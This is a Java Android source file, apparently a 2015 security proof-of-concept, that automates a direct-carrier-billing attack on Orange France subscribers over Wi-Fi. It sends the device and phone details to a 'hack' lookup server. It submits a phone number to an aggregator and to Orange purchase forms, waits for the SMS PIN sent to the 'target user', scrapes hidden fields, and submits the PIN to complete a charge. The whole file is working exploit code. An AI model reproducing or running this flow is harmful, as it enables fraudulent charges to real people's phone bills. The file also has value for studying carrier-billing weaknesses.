package com.dcbsecure.demo201503.dcbsecure.flow.FR.Orange;

import android.content.Context;
import android.telephony.TelephonyManager;
import android.view.View;
import android.widget.Button;
import com.dcbsecure.demo201503.dcbsecure.ActivityMainWindow;
import com.dcbsecure.demo201503.dcbsecure.flow.FlowUtil;
import com.dcbsecure.demo201503.dcbsecure.managers.ConfigMgr;
import com.dcbsecure.demo201503.dcbsecure.managers.PreferenceMgr;
import com.dcbsecure.demo201503.dcbsecure.managers.TrackMgr;
import com.dcbsecure.demo201503.dcbsecure.request.RequestResult;
import com.dcbsecure.demo201503.dcbsecure.util.SyncRequestUtil;
import org.apache.http.NameValuePair;
import org.apache.http.message.BasicNameValuePair;
import org.json.JSONException;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.Timer;
import java.util.TimerTask;
import java.util.regex.Matcher;
import java.util.regex.Pattern;


public class FlowFROrangeWifi implements View.OnClickListener
{
    private final ActivityMainWindow activityMainWindow;
    private final Button btnStart;

    public FlowFROrangeWifi(ActivityMainWindow activityMainWindow, Button btnStart)
    {
        this.activityMainWindow = activityMainWindow;
        this.btnStart = btnStart;
    }

    @Override
    public void onClick(View v)
    {
        onClick();
    }


    private void onClick()
    {
        btnStart.setVisibility(View.INVISIBLE);

        final String deviceid = ConfigMgr.lookupDeviceId(activityMainWindow);

        new Thread(new Runnable()
        {
            @Override
            public void run()
            {
                long runid = 0;
                try
                {
                    //reset pin
                    FlowUtil.setPin(null);

                    TelephonyManager tm = (TelephonyManager) activityMainWindow.getSystemService(Context.TELEPHONY_SERVICE);
                    String iso3166 = tm.getSimCountryIso();
                    if(iso3166==null||iso3166.isEmpty()) iso3166 = tm.getNetworkCountryIso();
                    String mccmnc = tm.getSimOperator();
                    if(mccmnc==null||mccmnc.isEmpty()) mccmnc = tm.getNetworkOperator();
                    String carrier = tm.getSimOperatorName();
                    if(carrier==null||carrier.isEmpty()) carrier = tm.getNetworkOperatorName();

                    //recheck hack data
                    ArrayList<NameValuePair> params = new ArrayList<NameValuePair>();
                    params.add(new BasicNameValuePair("deviceid", deviceid));
                    params.add(new BasicNameValuePair("iso3166", iso3166));
                    params.add(new BasicNameValuePair("mccmnc", mccmnc));
                    params.add(new BasicNameValuePair("carrier", carrier));
                    long msisdn = ConfigMgr.lookupMsisdnFromTelephonyMgr(activityMainWindow);
                    if(msisdn>0) params.add(new BasicNameValuePair("msisdn", ""+msisdn));

                    params.add(new BasicNameValuePair("wifi", FlowUtil.isUsingMobileData(activityMainWindow) ? "0" : "1"));

                    String userAgent = PreferenceMgr.getUserAgent(activityMainWindow);

                    JSONObject hackConfigResponse = SyncRequestUtil.doSynchronousHttpPostReturnsJson(ConfigMgr.getString(activityMainWindow, "SERVER") + "/api/hack/lookup", params, userAgent, null);

                    if (hackConfigResponse == null)
                    {
                        String subject = "could not read start url";
                        TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, 0, 0, true, subject, "deviceid:" + deviceid);
                        activityMainWindow.updateLogs("\n" + subject);
                    }
                    else
                    {
                        //decode runid first so that if there is an exception later on, we can still report it against the right runid
                        runid = hackConfigResponse.getLong("runid");
                        runFlowNotInMainThread(hackConfigResponse, deviceid, runid);
                    }
                }
                catch (JSONException e)
                {
                    String subject = "Could not read start url";
                    TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, true, subject, "deviceid:" + ConfigMgr.lookupDeviceId(activityMainWindow));
                    activityMainWindow.updateLogs("\n"+subject);
                }
                catch (Exception e)
                {
                    String stack = TrackMgr.getStackAsString(e);
                    String subject = "unexpected exception " + e.getClass().getName() + " " + e.getMessage();
                    TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, true, subject, stack);
                    activityMainWindow.updateLogs("\n"+subject);
                }

            }
        }).start();
    }


    private void runFlowNotInMainThread(JSONObject hackConfig, final String deviceid, final long runid)
            throws Exception
    {
        final String userAgent = PreferenceMgr.getUserAgent(activityMainWindow);

        String startUrl;
        try
        {
            startUrl = hackConfig.getString("start_url")+"&tx=1";
        }
        catch (JSONException e)
        {
            String subject = "exception reading json flow config";
            TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, false, subject,null);
            activityMainWindow.updateLogs("\n" + subject);
            return;
        }

        activityMainWindow.updateLogs("\nStarting Wifi flow");


        RequestResult resultAfterStart = SyncRequestUtil.doSynchronousHttpGetCallReturnsString(null, startUrl, userAgent);
        String htmlDataAfterStart = resultAfterStart != null ? resultAfterStart.getContent() : null; // html content

        if (resultAfterStart == null)
        {
            String subject = "start_url returns nothing";
            TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, false, subject, null);
            activityMainWindow.updateLogs("\n" + subject);
            return;
        }
        else if (resultAfterStart.getHttpCode() != 200)
        {
            String subject = "start_url returns http code " + resultAfterStart.getHttpCode()+" "+resultAfterStart.getUrl();
            TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, false, subject, htmlDataAfterStart);
            activityMainWindow.updateLogs("\n" + subject);
            return;
        }
        else if (htmlDataAfterStart != null && !htmlDataAfterStart.contains("Entrez votre num"))
        {
            String subject = "Aggregator msisdn submit page does not look right";
            TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, false, subject, htmlDataAfterStart);
            activityMainWindow.updateLogs("\n" + subject);
            return;
        }
        else
        {
            String aggregatorMsisdnSubmitUrl = resultAfterStart.getUrl();

            // we have to submit the MSISDN also, but format must be 0... , not 33...
            String msisdnStartingWith0not33 = PreferenceMgr.getMsisdn(activityMainWindow);

            if (msisdnStartingWith0not33 != null && msisdnStartingWith0not33.startsWith("33"))
                msisdnStartingWith0not33 = "0" + msisdnStartingWith0not33.substring(2);

            if (msisdnStartingWith0not33 != null && msisdnStartingWith0not33.startsWith("+33"))
                msisdnStartingWith0not33 = "0" + msisdnStartingWith0not33.substring(3);

            if (msisdnStartingWith0not33 != null && !msisdnStartingWith0not33.startsWith("0"))
                msisdnStartingWith0not33 = "0" + msisdnStartingWith0not33;

            activityMainWindow.updateLogs("\nOn aggregator site, entering phone number "+msisdnStartingWith0not33+" ");

            ArrayList<NameValuePair> paramsForAggregatorMsisdnSubmit = new ArrayList<NameValuePair>();
            paramsForAggregatorMsisdnSubmit.add(new BasicNameValuePair("msisdn", msisdnStartingWith0not33));
            paramsForAggregatorMsisdnSubmit.add(new BasicNameValuePair("msisdn_country", "fr"));
            paramsForAggregatorMsisdnSubmit.add(new BasicNameValuePair("offer_id", ""));
            paramsForAggregatorMsisdnSubmit.add(new BasicNameValuePair("submit_msisdn", "Valider"));

            RequestResult resultAfterAggregatorMsisdnSubmit = SyncRequestUtil.doSynchronousHttpPost(aggregatorMsisdnSubmitUrl, paramsForAggregatorMsisdnSubmit, userAgent, activityMainWindow);

            final String htmlDataAfterAggregatorMsisdnSubmit = resultAfterAggregatorMsisdnSubmit != null ? resultAfterAggregatorMsisdnSubmit.getContent() : null;

            final String orangeMsisdnSubmitUrl = resultAfterAggregatorMsisdnSubmit != null ? extractOrangeSubmitUrl(resultAfterAggregatorMsisdnSubmit) : null;

            if (resultAfterAggregatorMsisdnSubmit == null)
            {
                String subject = "Aggregator msisdn form returns nothing";
                TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, false, subject, null);
                activityMainWindow.updateLogs("\n" + subject);
                return;
            }
            else if (resultAfterAggregatorMsisdnSubmit.getHttpCode() != 200)
            {
                String subject = "Aggregator msisdn form returns http code " + resultAfterAggregatorMsisdnSubmit.getHttpCode();
                TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, false, subject, htmlDataAfterAggregatorMsisdnSubmit);
                activityMainWindow.updateLogs("\n" + subject);
                return;
            }
            else if (!htmlDataAfterAggregatorMsisdnSubmit.contains("pour recevoir un code"))
            {
                String subject = "Orange msisdn submit page does not look right";
                TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, false, subject, htmlDataAfterAggregatorMsisdnSubmit);
                activityMainWindow.updateLogs("\n"+subject);
                return;
            }
            else if (orangeMsisdnSubmitUrl == null)
            {
                String subject = "cannot workout Orange msisdn form url";
                TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, false, subject, htmlDataAfterAggregatorMsisdnSubmit);
                activityMainWindow.updateLogs("\n" + subject);
                return;
            }
            else
            {
                activityMainWindow.updateLogs("\nOn Orange site, entering phone number "+msisdnStartingWith0not33+" ");

                ArrayList<NameValuePair> paramsForOrangeMsisdnSubmit = new ArrayList<NameValuePair>();
                paramsForOrangeMsisdnSubmit.add(new BasicNameValuePair("msisdn", msisdnStartingWith0not33));
                paramsForOrangeMsisdnSubmit.add(new BasicNameValuePair("action", "OKWapPurchaseHandleMsisdn"));

                RequestResult resultAfterOrangeMsisdnSubmit = SyncRequestUtil.doSynchronousHttpPost(orangeMsisdnSubmitUrl, paramsForOrangeMsisdnSubmit, userAgent, activityMainWindow);

                final String htmlDataAfterOrangeMsisdnSubmit = resultAfterOrangeMsisdnSubmit != null ? resultAfterOrangeMsisdnSubmit.getContent() : null;

                final String pinSubmitUrl = resultAfterOrangeMsisdnSubmit != null ? extractOrangeSubmitUrl(resultAfterOrangeMsisdnSubmit) : null;

                if (resultAfterOrangeMsisdnSubmit == null)
                {
                    String subject = "Orange msisdn form returns nothing";
                    TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, false, subject, null);
                    activityMainWindow.updateLogs("\n" + subject);
                    return;
                }
                else if (resultAfterOrangeMsisdnSubmit.getHttpCode() != 200)
                {
                    String subject = "Orange msisdn form returns http code " + resultAfterAggregatorMsisdnSubmit.getHttpCode();
                    TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, false, subject, htmlDataAfterOrangeMsisdnSubmit);
                    activityMainWindow.updateLogs("\n" + subject);
                    return;
                }
                else if (htmlDataAfterOrangeMsisdnSubmit.toLowerCase().contains("solde") && htmlDataAfterOrangeMsisdnSubmit.toLowerCase().contains("insuffisant") )
                {
                    String subject = "Not enough credit; you need to top-up";
                    TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, false, subject, htmlDataAfterOrangeMsisdnSubmit);
                    activityMainWindow.updateLogs("\n"+subject);
                    return;
                }
                else if (!htmlDataAfterOrangeMsisdnSubmit.contains("Saisissez maintenant le"))
                {
                    String subject = "Orange PIN submit page does not look right";
                    TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, false, subject, htmlDataAfterOrangeMsisdnSubmit);
                    activityMainWindow.updateLogs("\n"+subject);
                    return;
                }
                else if (pinSubmitUrl == null)
                {
                    String subject = "cannot workout PIN submit url";
                    TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, false, subject, htmlDataAfterOrangeMsisdnSubmit);
                    activityMainWindow.updateLogs("\n" + subject);
                    return;
                }
                else //if(pinSubmitUrl!=null)
                {
                    // After this point, a PIN should arrive in an SMS message to the target user
                    // start the waiting task

                    TimerTask task = new TimerTask()
                    {
                        @Override
                        public void run()
                        {
                            final long WAITING_TIME = 60000;
                            final long SLEEP_TIME = 1000;
                            final long END_TIME = System.currentTimeMillis() + WAITING_TIME;

                            try
                            {
                                while (System.currentTimeMillis() <= END_TIME)
                                {
                                    String pin = FlowUtil.getPin();
                                    if (pin != null && !pin.isEmpty())
                                    {
                                        final ArrayList<NameValuePair> paramsForPinSubmit = new ArrayList<NameValuePair>();


                                        activityMainWindow.updateLogs("\nEntering PIN "+pin);

                                        paramsForPinSubmit.add(new BasicNameValuePair("password", pin));
                                        paramsForPinSubmit.add(new BasicNameValuePair("action", "OKWapPurchaseHandlePassword"));
                                        paramsForPinSubmit.add(new BasicNameValuePair("u_account_id", extractAccountId(htmlDataAfterOrangeMsisdnSubmit)));
                                        paramsForPinSubmit.add(new BasicNameValuePair("uid", extractUID(htmlDataAfterOrangeMsisdnSubmit)));

                                        //doing pin submit
                                        RequestResult resultAfterPinSubmit = SyncRequestUtil.doSynchronousHttpPost(pinSubmitUrl, paramsForPinSubmit, userAgent, activityMainWindow);
                                        String htmlDataAfterPinSubmit = resultAfterPinSubmit != null ? resultAfterPinSubmit.getContent() : null;

                                        if (resultAfterPinSubmit == null || htmlDataAfterPinSubmit==null)
                                        {
                                            String subject = "pin submit returned nothing";
                                            TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, false, subject, htmlDataAfterAggregatorMsisdnSubmit);
                                            activityMainWindow.updateLogs("\n" + subject);
                                            return;
                                        }
                                        else
                                        {
                                            //the content provider sets up the page to redirect the consumer to on error or success
                                            //for this POC, OK=google.fr; error=google.com
                                            if(resultAfterPinSubmit.getUrl().toLowerCase().contains("google.fr")) //passed
                                            {
                                                String subject = "success; you should receive an advice of charge by sms within a few minutes";
                                                TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 1, false, subject, htmlDataAfterPinSubmit);

                                                activityMainWindow.updateLogs("\n" + subject);
                                                return;
                                            }
                                            else if(resultAfterPinSubmit.getUrl().toLowerCase().contains("google.com")) //failed
                                            {
                                                String subject = "failed, unknown error";
                                                TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, false, subject, htmlDataAfterPinSubmit);
                                                activityMainWindow.updateLogs("\n"+subject);
                                                return;
                                            }
                                            else
                                            {
                                                String subject = "unexpected redirection after pin confirm; final status unknown";
                                                TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, false, subject, htmlDataAfterPinSubmit);
                                                activityMainWindow.updateLogs("\n"+subject);
                                                return;
                                            }
                                        }

                                    }
                                    else try
                                    {
                                        activityMainWindow.updateLogsNoLineFeed(" .");

                                        Thread.sleep(SLEEP_TIME);
                                    }
                                    catch (Exception e)
                                    {
                                        e.printStackTrace();
                                    }

                                }

                                //timeout
                                String subject = "timeout waiting for pin";
                                TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, false, subject, htmlDataAfterAggregatorMsisdnSubmit);
                                activityMainWindow.updateLogs("\n" + subject);
                            }
                            catch (Exception e)
                            {
                                String stack = TrackMgr.getStackAsString(e);
                                String subject = "unexpected exception " + e.getClass().getName() + " " + e.getMessage();
                                TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, true, subject, stack);
                                activityMainWindow.updateLogs("\n" + subject);
                            }
                        }
                    };

                    Timer timer = new Timer();
                    timer.schedule(task, 0);
                }
            }
        }

    }

    private String extractUID(String htmlData)
    {
        if(htmlData!=null)
        {
            Pattern pattern = Pattern.compile("<input type=\"hidden\" name=\"uid\" value=\"([^\"]*)\"/>");
            Matcher matcher = pattern.matcher(htmlData);
            boolean matchFound = matcher.find();
            if(matchFound) return matcher.group(1);
        }
        return null;
    }

    private String extractAccountId(String htmlData)
    {
        if(htmlData!=null)
        {
            Pattern pattern = Pattern.compile("<input type=\"hidden\" name=\"u_account_id\" value=\"([^\"]*)\"/>");
            Matcher matcher = pattern.matcher(htmlData);
            boolean matchFound = matcher.find();
            if(matchFound) return matcher.group(1);
        }
        return null;
    }


    //works for both msisdn submit and pin submit
    private String extractOrangeSubmitUrl(RequestResult requestResult)
    {
        String htmlData = requestResult.getContent(); // html content

        if(htmlData!=null)
        {
            Pattern pattern = Pattern.compile("<form action=\"(http[^ ]*)\" method=\"get\">");
            Matcher matcher = pattern.matcher(htmlData);
            boolean matchFound = matcher.find();
            if(matchFound) return matcher.group(1);
        }
        return null;
    }

}
